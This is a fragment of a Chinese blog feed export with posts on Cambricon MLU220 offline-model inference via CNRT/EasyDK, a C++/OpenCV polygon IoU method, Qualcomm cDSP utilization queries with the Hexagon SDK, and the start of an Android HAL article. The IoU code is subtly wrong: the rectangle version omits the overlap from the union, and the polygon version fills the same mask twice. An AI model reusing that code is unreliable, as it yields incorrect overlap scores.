      <categories>
        <category>C&amp;CPP</category>
        <category>python</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jvm</tag>
        <tag>java</tag>
        <tag>android</tag>
        <tag>pybind11</tag>
      </tags>
  </entry>
  <entry>
    <title>寒武纪加速平台(MLU200系列) 摸鱼指南（四）--- 边缘端实例程序分析</title>
    <url>/2021/11/28/blog_idx_114/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


MLU220 开发板


Ubuntu18.04 + MLU270开发主机一台


aarch64-linux-gnu-gcc 6.x 交叉编译环境


前言

  阅读本文前，请务必须知以下前置文章概念：


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 ( https://blog.csdn.net/u011728480/article/details/121194076 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（二）— 模型移植-环境搭建》 ( https://blog.csdn.net/u011728480/article/details/121320982 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（三）— 模型移植-分割网络实例》 （ https://blog.csdn.net/u011728480/article/details/121456789 ）


  这里再次回顾一下《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》的内容，寒武纪加速卡是一个硬件平台，是最底层的存在，在硬件平台之上，有驱动，在驱动之上，有运行时。本文的离线模型就是基于运行时的api进行调用和处理，得到模型结果。
  本文作为本系列的终篇，将会从上文的离线模型开始，从头开始搭建我们的离线模型推理代码结构，经过合理的部署，能够在MLU220开发板正常的运行。
  若文中引用部分存在侵权，请及时联系我删除。




离线模型推理前置须知

  经过前文相关的介绍，我们可以知道我们主要调用的是运行时相关的api。这里存在两套api可以使用，一个是cnrt，一个是easydk。easydk是基于cnrt封装的api，大大简化了离线模型推理的开发流程。但是我们的开发主线是一致的，就是初始化mlu设备，加载模型，预处理，模型推理，后处理，处理结果。
  此外，寒武纪还提供了CNStream程序框架，基于EasyDk开发，以pipeline+observer的方式，提供了一个简单易用的框架，如果有兴趣，请查看其官网 https://github.com/Cambricon/CNStream 。
  我们其实要用的是EasyDK+CNRT的这种开发方式，构造一个类似CNStream这样的程序。


EasyDK简介与编译
  首先其官网是：https://github.com/Cambricon/easydk。
  其除了CNToolKit的依赖（neuware）之外，还依赖于glog,gflags,opencv，这些需要提前安装好。至于CNToolKit x86的版本的相关介绍已经在模型移植环境部分介绍过了。
  由于我们要开发边缘端离线模型推理程序，一般来说，我们主要还是使用到EasyDK里面的EasyInfer部分的内容。其编译流程的话就如其官方介绍：


cmake …


make


  如果熟悉cmake的编译流程的话，其实就知道上面的流程是非常普遍的。对于EasyDK的编译来说，在x86下面进行编译是很简单的，但是如果要进行交叉编译的话，最好只生成核心库，其他的sample和test都关闭。




完成离线模型在MLU270上的运行

  还记得在《寒武纪加速平台(MLU200系列) 摸鱼指南（三）— 模型移植-分割网络实例》一文中，我们可以看到，通过torch_mlu.core.mlu_model.set_core_version(‘MLU220’)，我们可以调整生成的离线模型运行的平台，可以是边缘端MLU220，可以是服务器部署端的MLU270。对的，没有看错，MLU270既可以做模型移植，也可以做离线模型的部署，就如同本系列的开篇所讲，这几个平台仅仅是部署场景的差异。
  为什么我们需要在MLU270上调试离线模型呢？因为方便。因为MLU220一般来说都需要交叉编译，特别是相关的依赖库的生成比较麻烦，如果MLU220的板卡也方便调试的话，那也可以直接基于MLU220进行开发和调试。
  由于我这边是EasyDK+CNRT混合调用的形式，因此我主要根据其官方的CNRT推理代码进行注释和介绍，并在相关位置标注哪些内容是EasyDK可以一步到位的。这里简单的回答几个疑问。为什么需要EasyDK这个库呢？为什么不直接基于CNRT进行开发？我的回答是根据项目推进的需要做出的选择。关于这种程序的最终形态，其实我还是期待直接基于CNRT开发，因为其有效，但是代价是你必须很熟悉的了解相关的内容。
  下面是官方推理代码介绍（可能会在顺序上做一些变更，其官方代码未处理一些返回值，自己编写的时候需要注意,此外,官方的代码有些遗漏的地方,我进行了修改）：
 /* Copyright (C) [2019] by Cambricon, Inc. */
 /* offline_test */
 /*
  * A test which shows how to load and run an offline model.
  * This test consists of one operation --mlp.
  *
  * This example is used for MLU270 and MLU220.
  *
  */

 #include "cnrt.h"
 #include &lt;stdio.h>
 #include &lt;stdlib.h>
 #include &lt;string.h>

 int offline_test(const char *name) &#123;

   // This example is used for MLU270 and MLU220. You need to choose the corresponding offline model.
   // when generating an offline model, u need cnml and cnrt both
   // when running an offline model, u need cnrt only
   // 第一步，你必须调用cnrtInit()初始化运行时环境
   cnrtInit(0);

   // 第二步， 就是检查MLU设备，并设定当前设备，这一步其实是为多设备推理准备的
   cnrtDev_t dev;
   cnrtGetDeviceHandle(&amp;dev, 0);
   cnrtSetCurrentDevice(dev);

   // 这里的第一二步其实可能创建一个EasyInfer对象就完成了，而且具备了完整的错误检查。

   // 
   // prepare model name
   // load model
   // 第三步，就是加载模型
   cnrtModel_t model;
   cnrtLoadModel(&amp;model, "test.cambricon");

   // get model total memory
   // 第四步，就是获取模型的一些属性，比如内存占用，并行性这些，这一步是可选的。
   int64_t totalMem;
   cnrtGetModelMemUsed(model, &amp;totalMem);
   printf("total memory used: %ld Bytes\n", totalMem);
   // get model parallelism
   int model_parallelism;
   cnrtQueryModelParallelism(model, &amp;model_parallelism);
   printf("model parallelism: %d.\n", model_parallelism);

   // 第五步，是建立推理逻辑流，这一步就是根据离线模型，在内存中动态生成模型推理结构。这里的"subnet0"是一个 kernel-func 名字，非固定，但是常见的名字都是subnet0，
   // 在.cambricon_twins配套文件中有相关定义。
   // 他这个和cuda编程其实比较类似，我们刚刚生成的模型推理结构其实被当做一个内核函数，函数名就是这个。
   // load extract function
   cnrtFunction_t function;
   cnrtCreateFunction(&amp;function);
   cnrtExtractFunction(&amp;function, model, "subnet0");



   // 第六步，获取输入输出节点个数和输入输出数据size。注意许多网络中有多个输入，也可能有多个输出。在次注意这个概念，后续的操作都在多个输入和多个输出的基础上设计的。
   int inputNum, outputNum;
   int64_t *inputSizeS, *outputSizeS;
   cnrtGetInputDataSize(&amp;inputSizeS, &amp;inputNum, function);
   cnrtGetOutputDataSize(&amp;outputSizeS, &amp;outputNum, function);

   // prepare data on cpu
   // 第7步，申请cpu上的输入输出内存，这里是二维指针哈，代表多个输入输出
   void **inputCpuPtrS = (void **)malloc(inputNum * sizeof(void *));
   void **outputCpuPtrS = (void **)malloc(outputNum * sizeof(void *));

   // allocate I/O data memory on MLU
   // 第8步，申请mlu上的输入输出内存，这里是二维指针哈，代表多个输入输出。
   // 此时还未真正申请数据内存，只是申请了数据节点的句柄（指针）
   void **inputMluPtrS = (void **)malloc(inputNum * sizeof(void *));
   void **outputMluPtrS = (void **)malloc(outputNum * sizeof(void *));

   // prepare input buffer
   // 第9步，分别对第8步的数据节点句柄申请真正的内存空间。这里的inputCpuPtrS和inputMluPtrS是一一对应的，这是内存地址不一样，内存管理者不一样。对输出也是同理。
   // malloc是标准c申请堆内存接口
   // cnrtMalloc是申请mlu所管理的内存接口,类比cuda的话,可以直接理解为申请显存
   for (int i = 0; i &lt; inputNum; i++) &#123;
         // converts data format when using new interface model
         inputCpuPtrS[i] = malloc(inputSizeS[i]);
         // malloc mlu memory
         cnrtMalloc(&amp;(inputMluPtrS[i]), inputSizeS[i]);
         cnrtMemcpy(inputMluPtrS[i], inputCpuPtrS[i], inputSizeS[i], CNRT_MEM_TRANS_DIR_HOST2DEV);
   &#125;
   // prepare output buffer
   for (int i = 0; i &lt; outputNum; i++) &#123;
         outputCpuPtrS[i] = malloc(outputSizeS[i]);
         // malloc mlu memory
         cnrtMalloc(&amp;(outputMluPtrS[i]), outputSizeS[i]);
   &#125;

   

   // 第10步,首先将预处理好的图像数据填充inputCpuPtrS, 拷贝cpu输入数据内存到mlu输入数据内存
   cv::Mat _in_img;
   _in_img = cv::imread("test.jpg");
   _in_img.convertTo(_in_img, CV_32FC3);
   
   for (int i = 0; i &lt; inputNum; i++) &#123;

       // 注意这里的memcpy是我添加的，一般来说，模型的数据输入都是fp16或者fp32，但是一般我们的opencv生成的uint8。需要转换成fp32，或者fp16。
       // 重要是事情发3次，注意图片的预处理后的数据格式以及模型输入的数据格式，不同的话，需要经过转换，官方提供了cnrtCastDataType来辅助转换过程。
       // 重要是事情发3次，注意图片的预处理后的数据格式以及模型输入的数据格式，不同的话，需要经过转换，官方提供了cnrtCastDataType来辅助转换过程。
       // 重要是事情发3次，注意图片的预处理后的数据格式以及模型输入的数据格式，不同的话，需要经过转换，官方提供了cnrtCastDataType来辅助转换过程。
       ::memcpy( inputCpuPtrS[i], _in_img.data, inputSizeS[i]);
       cnrtMemcpy(inputMluPtrS[i], inputCpuPtrS[i], inputSizeS[i], CNRT_MEM_TRANS_DIR_HOST2DEV);
   &#125;

   // 第10步，主要就是图像预处理，将图像数据传输到mlu上面去。

   // 第11步，主要是开始设置推理参数
   // prepare parameters for cnrtInvokeRuntimeContext
   void **param = (void **)malloc(sizeof(void *) * (inputNum + outputNum));
   for (int i = 0; i &lt; inputNum; ++i) &#123;
         param[i] = inputMluPtrS[i];
   &#125;
   for (int i = 0; i &lt; outputNum; ++i) &#123;
         param[inputNum + i] = outputMluPtrS[i];
   &#125;

   // 第12步，绑定设备和设置推理context
   // setup runtime ctx
   cnrtRuntimeContext_t ctx;
   cnrtCreateRuntimeContext(&amp;ctx, function, NULL);

   // compute offline
   cnrtQueue_t queue;
   cnrtRuntimeContextCreateQueue(ctx, &amp;queue);

   // bind device
   cnrtSetRuntimeContextDeviceId(ctx, 0);
   cnrtInitRuntimeContext(ctx, NULL);


   // 第13步，推理并等待推理结束。
   // invoke
   cnrtInvokeRuntimeContext(ctx, param, queue, NULL);

   // sync
   cnrtSyncQueue(queue);

   // 第14步，将数据从mlu拷贝回cpu，然后进行后续的后处理
   // copy mlu result to cpu
   for (int i = 0; i &lt; outputNum; i++) &#123;
         cnrtMemcpy(outputCpuPtrS[i], outputMluPtrS[i], outputSizeS[i], CNRT_MEM_TRANS_DIR_DEV2HOST);
   &#125;

   // 第15步，清理环境。
   // free memory space
   for (int i = 0; i &lt; inputNum; i++) &#123;
         free(inputCpuPtrS[i]);
         cnrtFree(inputMluPtrS[i]);
   &#125;
   for (int i = 0; i &lt; outputNum; i++) &#123;
         free(outputCpuPtrS[i]);
         cnrtFree(outputMluPtrS[i]);
   &#125;
   free(inputCpuPtrS);
   free(outputCpuPtrS);
   free(param);

   cnrtDestroyQueue(queue);
   cnrtDestroyRuntimeContext(ctx);
   cnrtDestroyFunction(function);
   cnrtUnloadModel(model);
   cnrtDestroy();

   return 0;
 &#125;

 int main() &#123;
   printf("mlp offline test\n");
   offline_test("mlp");
   return 0;
 &#125;
   下面我简单列出一些EasyDK的操作顺序：


上文的第三四五步其实对应的是EasyInfer下面的ModelLoader模块，当初始化ModelLoader模块，并传参给EasyInfer实例，就完成了三四五步的内容。其实前面这些内容都是固定形式的，并不是重点。重点是后面的数据输入、推理、数据输出部分。


上文的第6,7,8,9步其实都是在为模型在cpu和mlu上申请相关的内存空间。在EasyDk中有对应的接口直接完成内存申请。


注意上文的第10步，是比较重要的一步，包含了图像数据预处理，到图像数据类型转换，再到图像数据输入到mlu内存。


上文的第11,12步是为推理准备参数


上文的第13步开始推理


上文的第14步从mlu内存中拷贝出推理结果到cpu内存，然后进行后处理。


上文的第15步，清理环境。






离线模型在MLU220上的部署

  前一小节，主要还是完成离线模型推理的程序开发，并在MLU270上运行测试。本小节的主要内容是怎么将我们调好的程序部署到MLU220。
  部署到MLU220，我们面临的第一个问题就是交叉编译生成AARCH64的程序。这里包含3个部分依赖，CNToolkit-aarch64，easydk-aarch64，其他第三方库如opencv-aarch64等。这时，我们得到了aarch64的离线推理程序，并配合之前我们转换得到的mlu220版本的离线模型。
  当我们把生成好的程序放到mlu220板卡，这个时候，可能程序还是无法跑起来，因为可能驱动未加载，这个时候，建议找到驱动和固件，让mlu220运行起来。然后运行程序即可。
  下面是无mlu设备的报错示例：

    
        
    
 
  下面是加载驱动的最后日志：

    
        
    
 
  下面是运行程序的输出：

    
        
    
 




后记

  对于RK3399pro和寒武纪MLU220平台来说，一些出来时间较为长久的模型，由于优化的比较到位，速度相较于RK3399pro可能有个300%+的性能提升。但是对于一些新的模型和一些非经典（非大众）的模型，由于自带的优化或者网络结构的原因，可能只有30%+的性能提升，但是这也是令人高兴的事情，毕竟硬件升级之后，好多事情可以达到准实时。
  本系列的基本介绍就这些了，完结撒花~~~ ~~~。
参考文献


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 ( https://blog.csdn.net/u011728480/article/details/121194076 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（二）— 模型移植-环境搭建》 ( https://blog.csdn.net/u011728480/article/details/121320982 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（三）— 模型移植-分割网络实例》 （ https://blog.csdn.net/u011728480/article/details/121456789 ）


https://www.cambricon.com/


https://www.cambricon.com/docs/cnrt/user_guide_html/example/offline_mode.html


其他相关保密资料。







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
        <tag>边缘端</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>一种实用性较强的求IOU的算法（任意多边形之间的IOU）</title>
    <url>/2021/12/26/blog_idx_115/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  提到IOU，如果接触过目标检测，应该是很熟悉的，这个东西简直就是标配了。但是我之前见到的求IOU都是求两个矩形的IOU，由于矩形的特殊性，其IOU可以很简单的求。
  突然有一天，我要求一个矩形和一个多边形的IOU，这就让我突然有点懵，参考原来求两个矩形的IOU方式，完全无解。经过了询问大佬以及网上冲浪后，在某不起眼的地方发现了一个思路，一个匿名网友貌似提供了一句MATLAB的代码，给了我不错的启发。
  因此本文用c++和opencv实现了这部分代码。下面将会从IOU概念，两矩形的IOU，以及任意多边形之间的IOU顺序进行讲解。




交并比（Intersection of Union，IOU）

  我们定义一个多边形的面积为Area0，另外一个多边形的面积为Area1。那么IOU的数学定义为$IOU=\frac{Area_0 \cap Area_1}{Area_0 \cup Area_1}$。
  下面我们用一个示例图清晰的表达这个概念：

    
        
    
    
  其中B类区域就是两个多边形的交集。IOU求的是B类区域在A,B,C类区域中的占比。注意这里是占比。




两个矩形之间的IOU求法

  两个矩形的IOU求法其实交简单，根据一些性质，我们可以直接求出交集区域的宽和高，然后直接得到交集面积即可，这些都是常规写法。详情见如下代码：
float IOU(const cv::Rect &amp;r0, const cv::Rect &amp;r1)
&#123;

    if (r0.x &gt; r1.x + r1.width) return 0.f;&#x2F;&#x2F;top-x  r0 在r1右边
    if (r0.y &gt; r1.y + r1.height) return 0.f;&#x2F;&#x2F;top-y r0 在r1下边
    if (r0.x + r0.width &lt; r1.x) return 0.f;&#x2F;&#x2F;bottom-x r0 在r1左边
    if (r0.y + r0.height &lt; r1.y) return 0.f;&#x2F;&#x2F;bottom-y r0 在r1上边

    &#x2F;&#x2F; 此时必定相交
    float _overlap_w &#x3D; std::min(r0.x + r0.width, r1.x + r1.width) - std::max(r0.x, r1.x);&#x2F;&#x2F;得到相交矩形w

    float _overlap_h &#x3D; std::min(r0.y + r0.height, r1.y + r1.height) - std::max(r0.y, r1.y);&#x2F;&#x2F;得到相交矩形h

    &#x2F;&#x2F; maybe overflow
    return (_overlap_w * _overlap_h)&#x2F;(float)((r0.width*r0.height) + (r1.width*r1.height));

&#125;

  如上可知，可以直接根据相关面积，求出IOU。




两个多边形之间的IOU求法

  我们需要求两个多边形的IOU，这个时候我们根据两个矩形的思路想想，貌似不好弄。这个时候我们可以转变一下思路。
  我们首先肯定是知道两个多边形的最大外接矩形的，这个时候我们得到最大的外界矩形宽和高（注意，这里的宽和高一般是固定的，所以一般我们都不需要去求外接矩）。然后我们创建三个宽和高等于我们预设的一维矩阵M_A, M_B，M_C，并将其所有元素置为0。这个时候，我们分别将矩阵一用多边形P1来来填充M_A，在P1内的元素置为1，外的元素不变。对M_B用同样的方式去填充。这个时候我们去计算M_C，具体计算方法是将对应的M_A，M_B同一位置的元素相与后赋值给M_C(表达式为:$M_C(x,y) = M_A(x,y) &amp; M_B(x,y)$)。这个时候我们去统计M_A,M_B,M_C中1的个数，其实就得到了对应的面积（也可以叫做像素面积），这个时候我们就可以方便的求出IOU，值得注意的是opencv中提供了我们所需要的所有操作。
  下面我们用c++来实现以上的流程（注意，以下代码是实现的是N个多边形和M个多边形的IOU，若自己的需求不一样，请修改为对应的场景，代码是随手写的，未仔细验证，原理是这样的）。
float IoU(const std::vector&lt;std::vector&lt;cv::Point&gt;&gt; &amp;poly_array0, const std::vector&lt;std::vector&lt;cv::Point&gt;&gt; &amp;poly_array1, int max_w, int max_h)&#123;

        cv::Mat _poly0 &#x3D; cv::Mat::zeros(max_h, max_w, CV_8UC1);
        cv::Mat _poly1 &#x3D; cv::Mat::zeros(max_h, max_w, CV_8UC1);
        cv::Mat _result;

        std::vector&lt;cv::Point *&gt; _pts0;
        std::vector&lt;int&gt; _npts0;

        for(auto &amp;_v:poly_array0)&#123;

                if (_v.size() &lt; 3)&#x2F;&#x2F;invalid poly
                        return -1.f;

                _pts0.push_back((cv::Point *)&amp;_v[0]);
                _npts0.push_back((int)_v.size());
        &#125;

        std::vector&lt;cv::Point *&gt; _pts1;
        std::vector&lt;int&gt; _npts1;
        for(auto &amp;_v:poly_array1)&#123;

                if (_v.size() &lt; 3)&#x2F;&#x2F;invalid poly
                        return -1.f;

                _pts1.push_back((cv::Point *)&amp;_v[0]);
                _npts1.push_back((int)_v.size());
        &#125;
&#x2F;*

void cv::fillPoly	(	Mat &amp; 	img,
const Point ** 	pts,
const int * 	npts,
int 	ncontours,
const Scalar &amp; 	color,
int 	lineType &#x3D; LINE_8,
int 	shift &#x3D; 0,
Point 	offset &#x3D; Point() 
)	
*&#x2F;
        cv::fillPoly(_poly0, (const cv::Point **)&amp;_pts0[0], &amp;_npts0[0], _npts0.size(), cv::Scalar(1));

        cv::fillPoly(_poly0, (const cv::Point **)&amp;_pts1[0], &amp;_npts1[0], _npts1.size(), cv::Scalar(1));

        cv::bitwise_and(_poly0, _poly1, _result);

        int _area0 &#x3D; cv::countNonZero(_poly0);
        int _area1 &#x3D; cv::countNonZero(_poly1);
        int _intersection_area &#x3D; cv::countNonZero(_result);

        &#x2F;&#x2F; float _iou &#x3D; (float)_intersection_area&#x2F;(float)(_area0 + _area1 - _intersection_area);
        float _iou &#x3D; (float)_intersection_area&#x2F;(float)_area1;

        return _iou;
&#125;
  通过如上代码，我们用opencv就实现了我们预想的效果。




后记

  注意，这里需要延伸一点，求IOU，我们一般是用交集除以并集，但是有些时候，可能我们会用交集除以其中一个集合。比如：一个小矩形，一个大多边形的iou，其实按照标准写法来看，iou的数值不处理的话，不是那么可爱的。
  其实这里的几种用法还可以延伸出来，比如算两个立方体的重合度等等。
参考文献


https://docs.opencv.org/3.4/d6/d6e/group__imgproc__draw.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>数据结构与算法</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>计算机视觉</tag>
        <tag>深度学习</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>高通cDSP简单编程例子（实现查询高通cDSP使用率、签名），RK3588 npu使用率查询</title>
    <url>/2022/07/31/blog_idx_117/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


高通865 android盒子


Hexagon_SDK


前言

  由于业务需求，我们需要展示高通865的cpu/gpu/dsp的使用率，其中cpu/gpu是非常简单的。但是对于dsp来说，我找了许久，才发现了一点点端倪，下面就是这一部分成果。




高通cDSP使用率查询

  要实现高通dsp使用率的查询，我们最开始查询到的一点资料是一个sysmon tools，这个工具在高通的sdk中，这个工具可以查看相关的利用率，所以我们按照这个方向走下去。


安装高通dsp sdk
  去此网站下载sdk并安装（https://developer.qualcomm.com/software/hexagon-dsp-sdk/tools） 。注意，安装需要java环境，请自备。
  然后我们需要检查我们的环境配置。
  参考SDK目录中Hexagon_SDK/3.5.4/docs/calculator_c++.html，然后进入Hexagon_SDK\3.5.4\examples\common\calculator_c++目录，编译生成target文件及模拟文件。然后安装教程，将计算器例子拷贝到设备相关目录进行运行，成功得到计算结果。这代表环境配置正确。
  注意：这里可能会有很多问题，多看文档，多对比。特别是设备对应的dsp工具链选对，详情参考：Hexagon_SDK/3.5.4/docs/feature_matrix.html。
  在这一步的计算器例子执行完成之后，基本上，我们应该知道生成的文件有3个，一个是android adb 可执行文件，一个是可执行文件对应的ndk库。一个是ndk库对应的dsp调用so。它们之间的关系是执行可执行文件，查找对应的符号，然后通过fastrpc调用dsp对应的符号，并得到结果。详情参考：Hexagon_SDK/3.5.4/docs/APIs_FastRPC.html#FastRPC%20architecture


高通cDSP使用率查询原理分析
  在Hexagon_SDK\3.5.4\tools\utils\sysmon，当我把sysMon_DSP_Profiler_V2.apk安装到系统后，终于看到了cDSP使用率查询的一丝方法。从图中可知，我们得到了dsp的当前工作频率，以及当前的使用率。但是我的需求是制作一个小工具，能够直接打印出core utilization，所以需要想其他办法。

    
        
    
    
  当我了解到这些内容后，就得把目标放在高通sdk里面的perf相关内容里面，我查询了相关api和文档后（Hexagon_SDK/3.5.4/docs/APIs_DSP%20Clk%20&amp;%20Rsrc%20Mgmt.html），发现了两个相关的内容，DSP Power and Performance Management 以及 HAP PMU framework。但是这个时候，我还是没有办法知道官方的工具里面显示的使用率是怎么算的。最开始：根据文档Hexagon_SDK/3.5.4/docs/images/Hexagon_Document_Bundle.pdf 第9章 processor event symbols，我以为直接用COMMITTED_PKT_ANY及COMMITTED_PKT_SMT就能计算出使用率，但是经过我的分析，怎么算都对不上，这个时候我又把重心转向官方的分析工具，官方的分析工具能够保存数据，然后用官方的其他的工具来后处理之后进行分析，看看能否从这里找到一些相关信息。
  再次使用官方工具分析dsp信息然后保存相关的数据文件，然后dump到windows上，得到sysmon_CDSP.bin，用工具分析。在Hexagon_SDK\3.5.4\tools\utils\sysmon\parser_win_v2 目录有两个工具，一个是解析工具，一个是生成html报告，我们按照官方的方法生成html报告,如下图。

    
        
    
    
  我们打开生成的html报告，我在报告中总算查看到了QDSP6 Utilization和QDSP6 Core performance ，如下图。通过阅读相关含义，了解到了官方app中的core utilization的计算方法。其计算方法为：使用率=（总执行次数/当前频率(hz) * 采样时间(s)）* 100。原理解释：总执行次数除以当前频率下满载运行次数，得到使用率。这里的总执行次数由HAP_perf_get_pcycles来得到,当前运行频率由HAP_power_get得到。到此，整个技术上的链条打通了，现在开始编写小程序。

    
        
    
    


高通cDSP编程
  首先，直接复制一个calculator_c++官方例子工程来作为模板，根据我了解到的资料，直接选取makefile作为作为编译手段。通过编写dsp的小程序，然后得到我们的使用率。下面是重要api的展示。
/**
* Data type to retrieve power values from the ADSP
* @param type				-	Identifies the type to retrieve.
* @param max_mips			-	Max mips supported
* @param max_bus_bw			-	Max bus bw supported
* @param client_class		-	Current client class
* @param clkFreqHz			-	Current core CPU frequency
* @param aggregateAVSMpps	-	Aggregate AVS Mpps used by audio and voice
* @param dcvsEnabled		-	Indicates if dcvs is enabled / disabled.
*/
typedef struct &#123;
	HAP_Power_response_type type;
	union&#123;
		unsigned int max_mips;
		uint64 max_bus_bw;
		unsigned int client_class;
		unsigned int clkFreqHz;
		unsigned int aggregateAVSMpps;
		boolean dcvsEnabled;
	&#125;;
&#125; HAP_power_response_t;

/**
* Method to retrieve power values from the ADSP
* @param context	-	Ignored
* @param request	-	Response.
*/
int HAP_power_get(void* context, HAP_power_response_t* response);



/* 
  HAP_perf_get_pcycles 
   
  Gets the current 64-bit processor cycle count
   
  The processor cycle count is the current number of processor cycles executed
  since the Hexagon processor was last reset.
 
  Note that this counter stops incrementing whenever the DSP enters a low-power
  state (such as clock gating), as opposed to the qtimer, which increments 
  regardless of the DSP power state.

	
  Returns:
  Integer -- Current count of Hexagon processor cycle count.
*/
uint64 HAP_perf_get_pcycles(void);
  对于我们编写dsp小程序来说，有一个值得注意的地方，这些api虽然我们是在android ndk程序里面调用的，但是我们仅仅是在android ndk侧找到符号，然后通过fastrpc将参数发给dsp端，dsp端调用对应的api后，将结果返回给android ndk端。此部分重点参考前文环境配置部分，对于新手来说，很难理解或者说适应这个东西。


高通cDSP程序部署及签名
  由于高通的cDSP程序调用方式比较特殊，我们应该按照官方Hexagon_SDK/3.5.4/docs/calculator_c++.html例子中推荐的部署方式，如果需要自定义部署，请参考环境变量DSP_LIBRARY_PATH。也就是拷贝android侧文件到对应目录，拷贝dsp侧目录到对应目录。
  此外，当你真的自定义程序并部署使用的时候，会遇到签名问题。在开发阶段，我们都是使用testsign,具体详情参考：Hexagon_SDK/3.5.4/docs/Tools_Signing.html，就是按照官方方法生成一个对应的testsign-xxxx.so的文件，此文件包含了当前设备的id，能够让运行在当前设备上的程序免签。但是这种方法只能够用于调试，对于大规模使用，需要采取另外的部署方式，一种是联系厂家，提供批量签名工具，另外就是使用 Unsigned PD 功能（Unsigned PD is a sandboxed low-rights process that allows the signature-free modules to run on the cDSP.）。Unsigned PD可以让一些低权程序运行在dsp上，主要还是被用于神经网络推理。但是就是这个Unsigned PD也是不是那么好用的，这里直接copy小米mace框架里面的so和代码，在执行任何dsp api之前调用hexnn_controller_request_unsigned_pd（https://github.com/XiaoMi/mace/blob/fa72958a647be9457cf0a19d2f1195205a4b1a58/mace/runtimes/hexagon/dsp/hexagon_dsp_wrapper.cc） 。 这里不得不感叹一句，这些厂家的py关系真好。
  当所有部署完毕之后，执行dsp程序得到如下图结果：

    
        
    
    




RK3588 NPU使用率查询

  题外话，最近RK的npu使用率查询方法官方也提供了，在3588上，只用npu驱动为0.72+就可以。结果如下图：

    
        
    
    




后记

  这里关于dsp编程来说，我这里可以说仅仅是一个小demo，这个部分最有价值的还是计算加速部分，一些重要的向量运算，这次我没有这个需求就不去关注了。
  但是换句话说，有了这一部分的经验后，后面哪怕是学习一些深入的东西，也是有一点基础在的。
参考文献
[1]Qualcomm.Hexagon SDK 3.5.4 Doc
[2]RockChip.Rockchip_RKNPU_User_Guide_RKNN_API_V1.3.0_CN





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。如某些图片无法查看，请尝试开启外网
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>C&amp;CPP</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>cdsp</tag>
        <tag>qcom</tag>
        <tag>rk3588</tag>
        <tag>npu</tag>
      </tags>
  </entry>
  <entry>
    <title>Android HAL机制的深入理解及在Linux上移植和运行的一个好玩的HAL小例子</title>
    <url>/2014/07/03/blog_idx_120/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Ubuntu 18.04.x
前言

  近一年来，虽然还是做的是AIOT相关的事情，但是某些事情却发生了一些变化。随着个人的阅历提升，现在的AI在边缘端部署已经不局限于传统的linux这样的形态，这一年来，我已经逐渐接触到android的边缘端盒子这样的概念了。
  对于Android来说，我之前有所了解，但是停留的非常表面，只知道其是一个Linux内核+Android Runtime+app的这样的形态。但是如果我们将Android Runtime和App看作普通的Linux app，那么我们会发现Android和传统Linux的差别没有那么大，我们甚至可以将Android当成一个Linux发行版来使用。但是实际在使用过程中，最大的差异在于Android引入了许多的Android特有的内容，例如binder，log，adb等等，其次和linux下面编程的最大区别还是在于他们的基础c库不一样，一个是bonic c，一个的glibc，这一点可以说是贯穿我在使用Android的整个过程中。
  在使用Android的过程中，我们会听见一个HAL的词，整个HAL可以说是Android能够成功商业化的一个重要因素，因为其可以保护各个厂商的利益，然后反过来，正是由于各个厂家的支持，导致了Android的生态是非常丰富的。那么我们来看看这个HAL到底是干嘛的。
  由于网上有许多介绍HAL的文章了，本文不会重复一些基础的内容，因此本文后续的阅读需要读者至少对Linux和Android HAL有一个基础的了解后，才建议阅读本文。




HAL 深入分析

  首先Android HAL分为大概分为两个版本，一个新的和旧的，本文重点分析新版HAL原理。其中两种版本架构大概简介如下：


旧的HAL架构（libhardware_legacy.so）每个app都会加载模块，有重入问题，由于每个app直接加载对应的so，也导致app和模块接口耦合较大，非常不方便维护。


新的HAL架构module/stub，app访问对应硬件对应的服务，然后对应硬件服务通过抽象api，module id，设备id，代理后访问硬件。


   上面对新的架构说的还是有些表面了，下面我们深入分析其中的重要的几个结构（在hardware.h中），然后最后通过一个实际例子来深入理解它。


struct hw_module_t
  它的实际源码定义如下：
/**
 * Every hardware module must have a data structure named HAL_MODULE_INFO_SYM
 * and the fields of this data structure must begin with hw_module_t
 * followed by module specific information.
 */
typedef struct hw_module_t &#123;
    /** tag must be initialized to HARDWARE_MODULE_TAG */
    uint32_t tag;

    /**
